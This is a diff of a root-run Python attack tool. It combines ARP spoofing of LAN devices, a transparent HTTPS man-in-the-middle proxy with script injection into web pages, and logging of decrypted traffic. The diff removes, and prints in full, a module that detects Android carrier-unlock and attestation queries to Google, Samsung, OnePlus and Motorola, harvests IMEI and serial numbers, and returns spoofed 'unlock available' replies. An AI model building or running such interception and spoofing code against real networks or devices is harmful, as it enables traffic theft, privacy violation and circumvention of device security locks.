@@ -9,7 +9,6 @@ Run as root.
 
 import os
 import sys
-import stat
 import subprocess
 import time
 import json
@@ -33,8 +32,6 @@ import sqlite3
 import csv
 import ssl
 import gzip
-import fnmatch
-import signal
 from functools import wraps
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
@@ -427,10 +424,6 @@ except Exception as e:
     CERT_AUTHORITY = None
     CERT_CACHE = None
 
-# Placeholder globals for OEM unlock infrastructure (initialized later after class definitions)
-UNLOCK_QUERY_DETECTOR = None
-UNLOCK_RESPONSE_GENERATOR = None
-
 # ---------- HTTP Response Injection/Modification ----------
 class ResponseModifier:
     """Apply injection rules to HTTP responses."""
@@ -544,7 +537,7 @@ class ResponseModifier:
 
             if modified:
                 # Update Content-Length if body changed
-                if 'Content-Length' in headers:
+                if b'Content-Length' in str(headers).encode():
                     headers['Content-Length'] = str(len(body))
 
                 return ResponseModifier.rebuild_http_response(status_line, headers, body)
@@ -570,6 +563,7 @@ class ResponseModifier:
             return True
 
         # Convert wildcard pattern to regex
+        import fnmatch
         return fnmatch.fnmatch(hostname, pattern)
 
 # ---------- Traffic Persistence Database ----------
@@ -581,7 +575,6 @@ class TrafficDatabase:
             db_path = os.path.join(GATEWAY_DIR, 'https_traffic.db')
         self.db_path = db_path
         self.lock = threading.Lock()
-        self.initialized = False
         self._init_db()
 
     def _init_db(self):
@@ -613,12 +606,9 @@ class TrafficDatabase:
                 cursor.execute('CREATE INDEX IF NOT EXISTS idx_client_ip ON https_traffic(client_ip)')
                 conn.commit()
                 conn.close()
-                self.initialized = True
                 add_log('info', f'Traffic database initialized: {self.db_path}')
         except Exception as e:
             add_log('error', f'Failed to initialize traffic database: {e}')
-            self.initialized = False
-            raise
 
     def add_entry(self, entry: dict):
         """Add traffic entry to database."""
@@ -766,8 +756,7 @@ class HTTPManipulator:
                 chunk_end = chunk_start + chunk_size
                 result += data[chunk_start:chunk_end]
                 data = data[chunk_end + 2:]
-            except Exception as e:
-                add_log('warn', f'Error decoding chunked transfer encoding at offset {len(result)}: {e}')
+            except:
                 break
         return result
 
@@ -801,8 +790,8 @@ class HTTPManipulator:
             if headers.get('content-encoding', '').lower() == 'gzip':
                 try:
                     body = gzip.decompress(body)
-                except Exception as e:
-                    add_log('warn', f'Failed to decompress gzip body ({len(body)} bytes): {e}')
+                except:
+                    pass
 
             return {
                 'status_line': status_line,
@@ -863,229 +852,6 @@ def create_custom_http_reply(status_code: int, headers: dict, body: bytes) -> by
 
     header_block = ''.join([f"{k}: {v}\r\n" for k, v in headers.items()])
     return response_line.encode() + header_block.encode() + b'\r\n' + body
-
-# ---------- Phase 5E: OEM Unlock Query Detection ----------
-class UnlockQueryDetector:
-    """Detect OEM unlock status queries and identify device type.
-
-    Monitors HTTPS traffic for carrier lock verification queries made by
-    Android devices during recovery boot. Detects: Pixel (Google), Samsung (Knox),
-    OnePlus, Motorola, and generic Android devices.
-    """
-
-    def __init__(self):
-        self.query_patterns = {
-            'pixel': {
-                'hostnames': ['googleapis.com', 'google.com', 'play.google.com'],
-                'paths': ['/androiddeviceintegrity', '/oem_unlock', '/deviceStatus'],
-                'methods': ['POST'],
-            },
-            'samsung': {
-                'hostnames': ['knox.samsung.com', 'sslgate.samsung.com'],
-                'paths': ['/api/v2/device', '/unlock_status', '/knox/verify'],
-                'methods': ['POST'],
-            },
-            'oneplus': {
-                'hostnames': ['api.oneplusapi.com'],
-                'paths': ['/v1/oem_unlock', '/check'],
-                'methods': ['POST'],
-            },
-            'motorola': {
-                'hostnames': ['motorolasupport.com', 'bootloader-unlock.motorola.com'],
-                'paths': ['/bootloader-unlock', '/unlock/challenge'],
-                'methods': ['POST', 'GET'],
-            },
-        }
-
-    def detect_query(self, hostname, path, method, body):
-        """Detect if request is OEM unlock query.
-
-        Returns: (device_type or None, confidence 0-1)
-        """
-        hostname_lower = hostname.lower()
-        path_lower = path.lower()
-
-        for device_type, patterns in self.query_patterns.items():
-            # Check hostname
-            host_match = any(h in hostname_lower for h in patterns['hostnames'])
-            if not host_match:
-                continue
-
-            # Check path
-            path_match = any(p in path_lower for p in patterns['paths'])
-            if not path_match:
-                continue
-
-            # Check method
-            method_match = method.upper() in patterns['methods']
-            if not method_match:
-                continue
-
-            confidence = 0.95 if all([host_match, path_match, method_match]) else 0.7
-            return (device_type, confidence)
-
-        # Fallback: pattern matching in body for unknown devices
-        if body and ('unlock' in body.lower() or 'oem' in body.lower()):
-            return ('generic', 0.5)
-
-        return (None, 0)
-
-    def extract_device_id(self, hostname, path, body):
-        """Extract device identifiers (IMEI, serial, etc.) from query."""
-        device_info = {
-            'imei': None,
-            'serial': None,
-            'carrier': None,
-            'device_model': None,
-        }
-
-        try:
-            import json
-            # Try to parse as JSON
-            body_str = body.decode('utf-8', errors='ignore') if isinstance(body, bytes) else body
-            if body_str and body_str.strip().startswith('{'):
-                data = json.loads(body_str)
-                device_info['imei'] = data.get('imei') or data.get('device_imei')
-                device_info['serial'] = data.get('device_id') or data.get('serial') or data.get('device_serial')
-                device_info['carrier'] = data.get('carrier_name') or data.get('carrier')
-                device_info['device_model'] = data.get('device_model') or data.get('model')
-                if any(device_info.values()):
-                    add_log('dev', f'Extracted device info: IMEI={device_info.get("imei")}, Serial={device_info.get("serial")}, Carrier={device_info.get("carrier")}')
-        except Exception as e:
-            add_log('dev', f'Failed to parse device info from query body: {e}')
-
-        return device_info
-
-class ResponseTemplateGenerator:
-    """Generate device-specific unlock status responses.
-
-    Creates spoofed responses that match carrier format for each device type,
-    signaling to devices that OEM unlock is available.
-    """
-
-    def __init__(self):
-        self.response_cache = {}  # Cache responses per device_type + device_id
-
-    def generate_response(self, device_type, request_body, device_id):
-        """Generate appropriate unlock response for device type.
-
-        Returns: (status_code, headers_dict, body_bytes)
-        """
-        if device_type == 'pixel':
-            return self._generate_pixel_response(request_body, device_id)
-        elif device_type == 'samsung':
-            return self._generate_samsung_response(request_body, device_id)
-        elif device_type == 'oneplus':
-            return self._generate_oneplus_response(request_body, device_id)
-        elif device_type == 'motorola':
-            return self._generate_motorola_response(request_body, device_id)
-        else:
-            return self._generate_generic_response(request_body, device_id)
-
-    def _generate_pixel_response(self, request_body, device_id):
-        """Generate Google/Pixel unlock response (JSON)."""
-        import json
-        response_body = {
-            "unlock_status": "available",
-            "carrier_locked": False,
-            "device_verified": True,
-            "message": "OEM Unlock available"
-        }
-        headers = {
-            'Content-Type': 'application/json',
-            'Content-Length': str(len(json.dumps(response_body))),
-        }
-        return (200, headers, json.dumps(response_body).encode('utf-8'))
-
-    def _generate_samsung_response(self, request_body, device_id):
-        """Generate Samsung Knox unlock response (JSON)."""
-        import json
-        response_body = {
-            "device_state": "unlocked",
-            "sim_locked": False,
-            "knox_status": "green",
-            "attestation_result": {
-                "verified": True,
-                "device_compliant": True
-            },
-            "unlock_available": True
-        }
-        headers = {
-            'Content-Type': 'application/json',
-            'X-Knox-Version': '3.8',
-        }
-        return (200, headers, json.dumps(response_body).encode('utf-8'))
-
-    def _generate_oneplus_response(self, request_body, device_id):
-        """Generate OnePlus unlock response (JSON)."""
-        import json
-        import time
-        response_body = {
-            "unlock_available": True,
-            "device_id": device_id or "unknown",
-            "reason": "ok",
-            "valid_until": int(time.time()) + 86400
-        }
-        headers = {'Content-Type': 'application/json'}
-        return (200, headers, json.dumps(response_body).encode('utf-8'))
-
-    def _generate_motorola_response(self, request_body, device_id):
-        """Generate Motorola bootloader response with challenge-response protocol.
-
-        Motorola uses a challenge-response handshake:
-        - First request: device sends no challenge → server responds with challenge
-        - Second request: device sends challenge → server responds with challenge_accepted
-        """
-        import json
-        import secrets
-
-        try:
-            # Parse request to check for challenge
-            challenge_in_request = None
-            if request_body:
-                try:
-                    req_data = json.loads(request_body) if isinstance(request_body, str) else json.loads(request_body.decode('utf-8'))
-                    challenge_in_request = req_data.get('challenge')
-                except (json.JSONDecodeError, UnicodeDecodeError, AttributeError):
-                    pass
-
-            if challenge_in_request:
-                # Device sent challenge → respond with acceptance
-                response_body = {
-                    "device_id": device_id or "unknown",
-                    "status": "challenge_accepted",
-                    "challenge_response": secrets.token_hex(32),  # 64-char hex response
-                    "unlock_available": True
-                }
-            else:
-                # First query → send challenge to device
-                response_body = {
-                    "device_id": device_id or "unknown",
-                    "status": "bootloader_unlock_available",
-                    "challenge": secrets.token_hex(32),  # 64-char hex challenge
-                    "unlock_supported": True
-                }
-        except Exception as e:
-            add_log('warn', f'Motorola response generation error: {e}, falling back to basic response')
-            response_body = {
-                "device_id": device_id or "unknown",
-                "status": "bootloader_unlock_supported",
-                "challenge_accepted": True
-            }
-
-        headers = {'Content-Type': 'application/json'}
-        return (200, headers, json.dumps(response_body).encode('utf-8'))
-
-    def _generate_generic_response(self, request_body, device_id):
-        """Generic fallback response (JSON)."""
-        import json
-        response_body = {
-            "status": "success",
-            "unlock_enabled": True,
-            "error": None
-        }
-        headers = {'Content-Type': 'application/json'}
-        return (200, headers, json.dumps(response_body).encode('utf-8'))
 
 class HTTPSInterceptProxy:
     """Pure Python HTTPS interception proxy (transparent MITM).
@@ -1258,9 +1024,8 @@ class HTTPSInterceptProxy:
             if upstream_socket:
                 try:
                     upstream_socket.close()
-                    add_log('dev', 'Closed upstream socket')
-                except Exception as e:
-                    add_log('warn', f'Error closing upstream socket: {e}')
+                except:
+                    pass
 
         return True
 
@@ -1337,17 +1102,11 @@ class HTTPSInterceptProxy:
                 return
 
             # Connect to upstream server
-            upstream_socket = None
             try:
                 upstream_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 upstream_socket.settimeout(10)
                 upstream_socket.connect((hostname, 443))
             except socket.error as e:
-                if upstream_socket:
-                    try:
-                        upstream_socket.close()
-                    except:
-                        pass
                 add_log('error', f'Failed to connect to {hostname}:443 - {e}')
                 return
 
@@ -1359,11 +1118,6 @@ class HTTPSInterceptProxy:
             try:
                 upstream_tls = upstream_context.wrap_socket(upstream_socket, server_hostname=hostname)
             except ssl.SSLError as e:
-                if upstream_socket:
-                    try:
-                        upstream_socket.close()
-                    except:
-                        pass
                 add_log('error', f'Upstream TLS failed for {hostname}:443: {type(e).__name__}: {e}')
                 return
 
@@ -1375,22 +1129,19 @@ class HTTPSInterceptProxy:
         finally:
             try:
                 client_socket.close()
-                add_log('dev', f'Closed client socket from {client_addr[0]}')
-            except Exception as e:
-                add_log('warn', f'Error closing client socket: {e}')
+            except:
+                pass
             if upstream_socket:
                 try:
                     upstream_socket.close()
-                    add_log('dev', 'Closed upstream socket')
-                except Exception as e:
-                    add_log('warn', f'Error closing upstream socket: {e}')
+                except:
+                    pass
 
     def _forward_traffic(self, client_tls, upstream_tls, hostname: str, client_ip: str):
         """Forward traffic between client and upstream server.
 
         Phase 1 (current): Decrypt, log, forward unchanged.
         Phase 2 (future): Decrypt, modify, re-encrypt.
-        Phase 5E: Intercept OEM unlock queries and inject spoofed responses.
 
         Args:
             client_tls: TLS socket to client device
@@ -1403,56 +1154,16 @@ class HTTPSInterceptProxy:
             client_tls.settimeout(0.1)
             upstream_tls.settimeout(0.1)
             buffer_size = 4096
-            request_buffer = b''  # Buffer for incomplete HTTP requests
 
             while True:
                 try:
                     # Client → Upstream
                     data = client_tls.recv(buffer_size)
                     if data:
-                        request_buffer += data
-
+                        upstream_tls.sendall(data)
                         # Phase 1: Log HTTP requests (first line contains method/path)
-                        # Check for valid HTTP methods (GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS, CONNECT, TRACE)
-                        if b' HTTP/' in request_buffer[:100]:  # HTTP method line usually within first 100 bytes
-                            # Try to parse HTTP request
-                            request_parts = self._parse_http_request(request_buffer)
-                            if request_parts:
-                                method, path, headers, body = request_parts
-
-                                # Phase 5E: Detect OEM unlock queries
-                                if UNLOCK_QUERY_DETECTOR:
-                                    device_type, confidence = UNLOCK_QUERY_DETECTOR.detect_query(hostname, path, method, body)
-
-                                    if device_type and confidence > 0.7:
-                                        add_log('info', f'OEM unlock query detected: {device_type} from {client_ip} → {hostname}{path}')
-
-                                        # Extract device identifiers
-                                        device_info = UNLOCK_QUERY_DETECTOR.extract_device_id(hostname, path, body)
-                                        device_id = device_info.get('serial') or device_info.get('imei') or 'unknown'
-
-                                        # Generate spoofed unlock response
-                                        if UNLOCK_RESPONSE_GENERATOR:
-                                            status, resp_headers, resp_body = UNLOCK_RESPONSE_GENERATOR.generate_response(
-                                                device_type, body, device_id
-                                            )
-
-                                            # Build HTTP response
-                                            spoofed_response = create_custom_http_reply(status, resp_headers, resp_body)
-                                            client_tls.sendall(spoofed_response)
-
-                                            add_log('success', f'OEM unlock response injected for {device_type} device (latency: instant)')
-                                            self._log_http_request(request_buffer, hostname, client_ip)
-                                            self._log_http_response(spoofed_response, hostname, client_ip)
-
-                                            # Clear buffer and continue listening
-                                            request_buffer = b''
-                                            continue
-
-                                # Not an unlock query - forward to upstream normally
-                                self._log_http_request(request_buffer, hostname, client_ip)
-                                upstream_tls.sendall(request_buffer)
-                                request_buffer = b''
+                        if data.startswith(b'GET') or data.startswith(b'POST') or data.startswith(b'PUT'):
+                            self._log_http_request(data, hostname, client_ip)
                 except socket.timeout:
                     pass
 
@@ -1464,11 +1175,16 @@ class HTTPSInterceptProxy:
                         parsed = HTTPManipulator.parse_http_response(data)
 
                         # Apply injection rules to modify response content
+                        modified_body = parsed['body']
                         if 'text/html' in parsed['headers'].get('content-type', '').lower():
                             # Example: Inject logging script before </body>
-                            data = ResponseModifier.apply_rules(hostname, data)
-                            # Re-parse modified response for logging
-                            parsed = HTTPManipulator.parse_http_response(data)
+                            injection = ResponseModifier.apply_rules(hostname, parsed['body'])
+                            if injection != parsed['body']:
+                                modified_body = injection
+
+                        # Rebuild response with modified body
+                        if modified_body != parsed['body']:
+                            data = HTTPManipulator.rebuild_http_response(parsed, modified_body)
 
                         client_tls.sendall(data)
                         # Log HTTP responses (first line contains status code)
@@ -1523,49 +1239,6 @@ class HTTPSInterceptProxy:
         except Exception as e:
             add_log('warn', f'Failed to log HTTP response: {e}')
 
-    def _parse_http_request(self, data: bytes):
-        """Parse HTTP request from buffer.
-
-        Returns: (method, path, headers_dict, body_bytes) or None if incomplete.
-        """
-        try:
-            # Look for double CRLF that separates headers from body
-            if b'\r\n\r\n' not in data:
-                return None  # Incomplete request
-
-            header_section, body = data.split(b'\r\n\r\n', 1)
-            lines = header_section.split(b'\r\n')
-
-            if not lines:
-                return None
-
-            # Parse request line: "GET /path HTTP/1.1"
-            request_line = lines[0].decode('ascii', errors='ignore')
-            parts = request_line.split()
-
-            if len(parts) < 2:
-                return None
-
-            method = parts[0]  # GET, POST, etc.
-            path = parts[1]    # /path?query
-
-            # Parse headers
-            headers = {}
-            for line in lines[1:]:
-                if b':' in line:
-                    key, value = line.split(b':', 1)
-                    headers[key.decode('ascii', errors='ignore').strip().lower()] = value.decode('ascii', errors='ignore').strip()
-
-            # Handle Content-Length to get complete body
-            content_length = int(headers.get('content-length', 0))
-            if len(body) < content_length:
-                return None  # Incomplete body
-
-            return (method, path, headers, body[:content_length])
-        except Exception as e:
-            add_log('dev', f'HTTP request parse error: {e}')
-            return None
-
     def start(self):
         """Start MITM proxy server listening on port 8888."""
         if self.running:
@@ -1582,24 +1255,7 @@ class HTTPSInterceptProxy:
         try:
             server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-
-            # Try to bind to configured port, or fallback to alternate ports if busy
-            ports_to_try = [self.listen_port, 8889, 8890, 8891, 8892]
-            bound = False
-            for port in ports_to_try:
-                try:
-                    server_socket.bind(('0.0.0.0', port))
-                    self.listen_port = port  # Update actual port
-                    bound = True
-                    break
-                except OSError as e:
-                    if port == ports_to_try[-1]:
-                        raise  # All ports failed, raise error
-                    continue  # Try next port
-
-            if not bound:
-                raise OSError(f'Could not bind to any port from {ports_to_try}')
-
+            server_socket.bind(('0.0.0.0', self.listen_port))
             server_socket.listen(10)
             add_log('info', f'MITM proxy listening on port {self.listen_port}')
 
@@ -1712,46 +1368,6 @@ class ARPSpoofingFallback:
             else:
                 self.real_gateway_mac = match.group(1)
 
-            # Resolve target MAC addresses for unicast ARP spoofing (avoids switch ignoring broadcast ARP)
-            add_log('info', f'Resolving MAC addresses for {len(targets)} target(s) (unicast ARP spoofing)')
-            self.target_macs = {}  # Map target_ip → target_mac
-            for target_ip in targets:
-                mac = None
-                try:
-                    # Try arping first (more reliable for live hosts)
-                    try:
-                        result = subprocess.check_output(
-                            ['arping', '-c', '1', '-w', '1', target_ip],
-                            stderr=subprocess.PIPE, text=True, timeout=3
-                        )
-                        # arping output: "Unicast reply from X [YY:YY:YY:YY:YY:YY]"
-                        match = re.search(r'\[([0-9a-fA-F:]{17})\]', result)
-                        if match:
-                            mac = match.group(1)
-                    except:
-                        pass
-
-                    # Fallback: use arp -n command
-                    if not mac:
-                        result = subprocess.check_output(
-                            ['arp', '-n', target_ip],
-                            stderr=subprocess.PIPE, text=True, timeout=2
-                        )
-                        # arp output: "... at YY:YY:YY:YY:YY:YY [ether]"
-                        match = re.search(r'([0-9a-fA-F:]{17})', result)
-                        if match:
-                            mac = match.group(1)
-
-                    if mac:
-                        self.target_macs[target_ip] = mac
-                        add_log('dev', f'Target {target_ip} → MAC {mac} (unicast ARP will be used)')
-                    else:
-                        add_log('warn', f'Could not resolve MAC for {target_ip}; will use broadcast fallback for this target')
-                        self.target_macs[target_ip] = 'ff:ff:ff:ff:ff:ff'
-                except Exception as e:
-                    add_log('warn', f'Error resolving MAC for {target_ip}: {e}; using broadcast fallback')
-                    self.target_macs[target_ip] = 'ff:ff:ff:ff:ff:ff'
-
             # Enable IP forwarding
             self._enable_ip_forwarding()
 
@@ -1823,7 +1439,6 @@ class ARPSpoofingFallback:
         """Continuously send ARP replies claiming to be the gateway.
 
         This makes target devices think we are the gateway, routing traffic through us.
-        Uses unicast ARP when MAC is known (preferred), broadcast as fallback.
         """
         try:
             # Build ARP reply packet: we claim to own the gateway IP
@@ -1833,38 +1448,24 @@ class ARPSpoofingFallback:
             while self.active:
                 for target_ip in targets:
                     try:
-                        # Get target MAC for unicast ARP (or use broadcast if unknown)
-                        target_mac = self.target_macs.get(target_ip, 'ff:ff:ff:ff:ff:ff')
-
-                        # ARP reply: we are gateway_ip, send unicast to target
-                        packet = self._build_arp_reply(src_mac_bytes, gateway_ip, target_ip, target_mac)
-                        success, method, error = SocketProxy.send_packet(packet, iface)
-                        if not success:
-                            add_log('warn', f'ARP spoof to {target_ip} ({target_mac}) failed ({method}): {error}')
-                        else:
-                            pkt_type = 'unicast' if target_mac != 'ff:ff:ff:ff:ff:ff' else 'broadcast'
-                            add_log('dev', f'ARP spoof to {target_ip} ({pkt_type}) via {method}')
+                        # ARP reply: we are gateway_ip
+                        packet = self._build_arp_reply(src_mac_bytes, gateway_ip, target_ip)
+                        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
+                        sock.bind((iface, 0))
+                        sock.send(packet)
+                        sock.close()
                     except Exception as e:
-                        add_log('warn', f'ARP spoof to {target_ip} exception: {e}')
+                        add_log('warn', f'ARP spoof to {target_ip} failed: {e}')
 
-                time.sleep(2)  # Re-spoof every 2 seconds to maintain ARP cache
+                time.sleep(2)  # Re-spoof every 2 seconds to maintain cache
 
         except Exception as e:
             add_log('error', f'ARP spoofing loop failed: {e}')
 
-    def _build_arp_reply(self, src_mac: bytes, gateway_ip: str, target_ip: str, target_mac_str: str = 'ff:ff:ff:ff:ff:ff') -> bytes:
-        """Build raw ARP reply packet.
-
-        Args:
-            src_mac: Our MAC address as bytes
-            gateway_ip: Gateway IP we're spoofing
-            target_ip: Target device IP
-            target_mac_str: Target MAC address (unicast) or 'ff:ff:ff:ff:ff:ff' (broadcast fallback)
-        """
-        # Parse target MAC (unicast or broadcast)
-        dst_mac = bytes.fromhex(target_mac_str.replace(':', ''))
-
+    def _build_arp_reply(self, src_mac: bytes, gateway_ip: str, target_ip: str) -> bytes:
+        """Build raw ARP reply packet."""
         # Ethernet header
+        dst_mac = bytes.fromhex('ffffffffffff')  # Broadcast
         frame_type = struct.pack('!H', 0x0806)  # ARP
 
         # ARP packet
@@ -1872,17 +1473,15 @@ class ARPSpoofingFallback:
         proto_type = struct.pack('!H', 0x0800)  # IPv4
         hw_len = struct.pack('!B', 6)  # MAC length
         proto_len = struct.pack('!B', 4)  # IP length
-        operation = struct.pack('!H', 2)  # Reply (not Request)
+        operation = struct.pack('!H', 2)  # Reply
 
         # Convert IPs to bytes
         gw_bytes = socket.inet_aton(gateway_ip)
         target_bytes = socket.inet_aton(target_ip)
 
-        # ARP reply: sender = us (claiming to be gateway), target = destination device
         arp_packet = (hw_type + proto_type + hw_len + proto_len + operation +
                       src_mac + gw_bytes + dst_mac + target_bytes)
 
-        # Ethernet frame: [dst_mac][src_mac][frame_type][arp_packet]
         return dst_mac + src_mac + frame_type + arp_packet
 
     def disable_arp_spoofing(self):
@@ -1935,12 +1534,7 @@ class ARPSpoofingFallback:
         }
 
 
-ARP_FALLBACK = None
-try:
-    ARP_FALLBACK = ARPSpoofingFallback()
-    add_log('dev', 'ARP spoofing fallback initialized')
-except Exception as e:
-    add_log('warn', f'Failed to initialize ARP spoofing fallback: {e} (ARP spoofing fallback disabled)')
+ARP_FALLBACK = ARPSpoofingFallback()
 
 # Initialize MITM proxy on startup
 try:
@@ -1988,41 +1582,15 @@ function FindProxyForURL(url, host) {{
     return pac_js.strip()
 
 
-# Initialize OEM unlock detection infrastructure (Phase 5E)
-UNLOCK_QUERY_DETECTOR = None
-UNLOCK_RESPONSE_GENERATOR = None
-try:
-    UNLOCK_QUERY_DETECTOR = UnlockQueryDetector()
-    add_log('dev', 'UnlockQueryDetector initialized successfully')
-except Exception as e:
-    add_log('error', f'Failed to initialize UnlockQueryDetector: {e} (OEM unlock detection disabled)')
-
-try:
-    UNLOCK_RESPONSE_GENERATOR = ResponseTemplateGenerator()
-    add_log('dev', 'ResponseTemplateGenerator initialized successfully')
-except Exception as e:
-    add_log('error', f'Failed to initialize ResponseTemplateGenerator: {e} (OEM unlock injection disabled)')
-
-if UNLOCK_QUERY_DETECTOR and UNLOCK_RESPONSE_GENERATOR:
-    add_log('success', 'OEM unlock Phase 5E infrastructure fully operational')
-elif UNLOCK_QUERY_DETECTOR or UNLOCK_RESPONSE_GENERATOR:
-    add_log('warn', 'OEM unlock Phase 5E partially operational (detector or generator unavailable)')
-else:
-    add_log('warn', 'OEM unlock Phase 5E disabled (initialization failed)')
-
 app = Flask(__name__)
 
 # Initialize traffic database
-TRAFFIC_DATABASE = None
 try:
-    db = TrafficDatabase()
-    if db.initialized:
-        TRAFFIC_DATABASE = db
-        add_log('success', 'Traffic database initialized')
-    else:
-        add_log('error', 'Traffic database initialization failed (db.initialized=False)')
+    TRAFFIC_DATABASE = TrafficDatabase()
+    add_log('success', 'Traffic database initialized')
 except Exception as e:
     add_log('error', f'Failed to initialize traffic database: {e}')
+    TRAFFIC_DATABASE = None
 
 @app.after_request
 def add_no_cache_headers(response):
@@ -2084,14 +1652,12 @@ def serve_pac_file():
     """Serve PAC (Proxy Auto-Config) file for browser/device proxy settings.
 
     Browsers will fetch this file and use it to determine which traffic
-    routes through the MITM proxy.
+    routes through the MITM proxy (port 8888).
 
     Access: http://pac.installCA.lan/pac or http://<device-ip>:5000/pac
     """
     device_ip = request.host.split(':')[0]
-    # Use actual port that HTTPS proxy is listening on (may not be 8888 if port conflict)
-    proxy_port = HTTPS_PROXY.listen_port if HTTPS_PROXY else 8888
-    pac_content = generate_pac_file(proxy_host=device_ip, proxy_port=proxy_port)
+    pac_content = generate_pac_file(proxy_host=device_ip, proxy_port=8888)
     return Response(pac_content, mimetype='application/x-ns-proxy-autoconfig')
 
 @app.route('/ca-cert', methods=['GET'])
@@ -2249,15 +1815,14 @@ def install_package(pkg_name):
 
         cmd = list(pm) + [pkg]
         try:
-            add_log('info', f'Installing {pkg_name} via {pm[0]} (package: {pkg})...')
+            add_log('info', f'Installing {pkg} ...')
             subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             if tool_exists(pkg):
                 _INSTALLED_TOOLS.add(pkg_name)
-                add_log('success', f'{pkg_name} installed via {pm[0]} successfully')
+                add_log('success', f'{pkg_name} installed via {pkg}')
                 return True
-            add_log('warn', f'Installation completed but {pkg} not found in PATH')
-        except Exception as e:
-            add_log('dev', f'Failed to install {pkg_name} via {pm[0]}: {e} (trying alternatives...)')
+        except:
+            add_log('info', f'Failed to install {pkg}, trying alternatives...')
             continue
 
     add_log('error', f'Failed to install {pkg_name} (tried: {", ".join(packages_to_try)})')
@@ -2268,15 +1833,9 @@ def tool_exists(name):
     try:
         out = subprocess.check_output(['which', name], stderr=subprocess.DEVNULL, text=True).strip()
         if not out:
-            add_log('dev', f'Tool not found in PATH: {name}')
             return False
-        if os.access(out, os.X_OK):
-            add_log('dev', f'Tool found and executable: {name} at {out}')
-            return True
-        add_log('warn', f'Tool found but not executable: {name} at {out}')
-        return False
-    except Exception as e:
-        add_log('warn', f'Error checking if tool exists: {name}: {e}')
+        return os.access(out, os.X_OK)
+    except:
         return False
 
 def ensure_tool(tool_name, package_name=None):
@@ -2314,8 +1873,8 @@ def get_my_ip_and_cidr(iface):
                 parts = line.split()
                 ip_cidr = parts[3]
                 return ip_cidr.split('/')
-    except Exception as e:
-        add_log('warn', f'Failed to get IP/CIDR for interface {iface}: {e}')
+    except:
+        pass
     return ('0.0.0.0', '24')
 
 def get_mac(iface):
@@ -2323,11 +1882,8 @@ def get_mac(iface):
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', iface[:15].encode()))
         s.close()
-        mac = info[18:24].hex(':')
-        add_log('dev', f'Retrieved MAC address for {iface}: {mac}')
-        return mac
-    except Exception as e:
-        add_log('warn', f'Failed to get MAC address for {iface}: {e}')
+        return info[18:24].hex(':')
+    except:
         return '00:00:00:00:00:00'
 
 # ---------- custom socket proxy layer with fallback chain ----------
@@ -2490,11 +2046,7 @@ def arp_scan(iface, my_ip, cidr):
     MAX_SCAN_HOSTS = 4096
     hosts = []
     for h in net.hosts():
-        ip_str = str(h)
-        # CRITICAL: Skip the device's own IP - don't ARP scan yourself
-        if ip_str == my_ip:
-            continue
-        hosts.append(ip_str)
+        hosts.append(str(h))
         if len(hosts) >= MAX_SCAN_HOSTS:
             add_log('warn', f'ARP scan capped at {MAX_SCAN_HOSTS} hosts (network {net} is larger); scan the subnet directly for full coverage')
             break
@@ -2543,9 +2095,8 @@ def arp_scan(iface, my_ip, cidr):
     if sock:
         try:
             sock.close()
-            add_log('dev', f'Closed ARP scan socket for {iface}')
-        except Exception as e:
-            add_log('warn', f'Error closing ARP scan socket: {e}')
+        except:
+            pass
     return results
 
 def get_gateway_mac(iface, gateway_ip):
@@ -2553,12 +2104,9 @@ def get_gateway_mac(iface, gateway_ip):
         out = subprocess.check_output(['ip', 'neigh', 'show', gateway_ip], text=True)
         m = re.search(r'(([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})', out)
         if m:
-            mac = m.group(1)
-            add_log('dev', f'Retrieved gateway MAC for {gateway_ip}: {mac}')
-            return mac
-        add_log('dev', f'No MAC address found for gateway {gateway_ip} in arp output')
-    except Exception as e:
-        add_log('dev', f'Failed to get gateway MAC via ip neigh: {e} (will try ARP scan)')
+            return m.group(1)
+    except:
+        pass
     my_ip, cidr = get_my_ip_and_cidr(iface)
     hosts = arp_scan(iface, my_ip, cidr)
     for h in hosts:
@@ -2570,10 +2118,8 @@ def server_ping(ip, timeout=1):
     try:
         subprocess.check_output(['ping', '-c', '1', '-W', str(timeout), ip],
                                 stderr=subprocess.DEVNULL, timeout=timeout+1)
-        add_log('dev', f'Ping succeeded for {ip}')
         return True
-    except Exception as e:
-        add_log('dev', f'Ping failed for {ip}: {e}')
+    except:
         return False
 
 def server_tcp_connect(ip, port, timeout=1):
@@ -2582,13 +2128,8 @@ def server_tcp_connect(ip, port, timeout=1):
         s.settimeout(timeout)
         result = s.connect_ex((ip, port))
         s.close()
-        if result == 0:
-            add_log('dev', f'TCP connection succeeded: {ip}:{port}')
-        else:
-            add_log('dev', f'TCP connection failed: {ip}:{port} (error code: {result})')
         return result == 0
-    except Exception as e:
-        add_log('warn', f'Error during TCP connect attempt to {ip}:{port}: {e}')
+    except:
         return False
 
 # ---------- nmap recon ----------
@@ -2643,24 +2184,16 @@ def get_iface_bytes(iface):
                 if name.strip() != iface:
                     continue
                 fields = data.split()
-                rx_bytes, tx_bytes = int(fields[0]), int(fields[8])
-                add_log('dev', f'Interface {iface} stats: RX={rx_bytes} bytes, TX={tx_bytes} bytes')
-                return rx_bytes, tx_bytes
-    except Exception as e:
-        add_log('warn', f'Failed to get interface bytes for {iface}: {e}')
+                return int(fields[0]), int(fields[8])
+    except:
+        pass
     return None
 
 # ---------- gateway: shared helpers ----------
 def proc_running(name):
     try:
-        result = subprocess.run(['pgrep', '-x', name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0
-        if result:
-            add_log('dev', f'Process found: {name}')
-        else:
-            add_log('dev', f'Process not found: {name}')
-        return result
-    except Exception as e:
-        add_log('warn', f'Error checking if process {name} is running: {e}')
+        return subprocess.run(['pgrep', '-x', name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0
+    except:
         return False
 
 def stop_proc(name):
@@ -2671,24 +2204,20 @@ def get_local_ip():
     if iface:
         ip, _ = get_my_ip_and_cidr(iface)
         if ip and ip != '0.0.0.0':
-            add_log('dev', f'Local IP from interface {iface}: {ip}')
             return ip
     try:
